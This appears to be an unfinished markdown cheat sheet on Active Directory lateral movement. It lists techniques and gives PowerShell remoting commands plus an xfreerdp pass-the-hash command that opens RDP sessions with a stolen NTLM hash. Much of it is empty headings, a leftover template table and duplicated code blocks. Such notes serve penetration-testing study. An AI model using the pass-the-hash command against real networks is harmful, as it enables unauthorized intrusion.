# Active Directory Lateral Movement

| TTP         | Description |
| ----------- | ----------- |
| Header      | Title       |
| Paragraph   | Text        |





- Windows Services
- WinRM
- PsExec
- RDP
- WMI
- DCOM
- Webclient
- CrackMapExec
- MSSQL


## Windows Services



## PowerShell Remoting
Enable PowerShell Remoting on current Machine (Needs Admin Access)

```powershell
Enable-PSRemoting
```

Entering or Starting a new PSSession (Needs Admin Access)

```powershell
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

```powershell
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

## Lateral Movement usind RDP
If we have a NTLM hash we can have an RDP session

### xFreeRDP

```bash
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
```


```powershell
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```





